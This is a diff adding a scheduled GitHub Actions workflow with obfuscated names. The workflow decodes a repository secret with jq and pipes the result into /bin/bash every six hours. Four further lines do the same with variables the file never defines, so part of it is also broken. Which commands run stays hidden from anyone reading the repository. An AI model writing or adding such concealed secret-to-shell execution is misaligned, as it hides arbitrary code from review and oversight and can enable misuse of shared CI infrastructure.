@@ -1,0 +1,22 @@
+name: suoyijiameng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: suoyijiameng
+        env:
+          ltpss495: ${{ secrets.ltpss495 }}
+        run: |
+          echo $ltpss495 | jq -r .ps5 | /bin/bash
+          echo $lizty91 | jq -r .lvnz466 | /bin/bash
+          echo $q2 | jq -r .tye9522 | /bin/bash
+          echo $tdpt47 | jq -r .wee414 | /bin/bash
+          echo $juxx20 | jq -r .l99 | /bin/bash
+
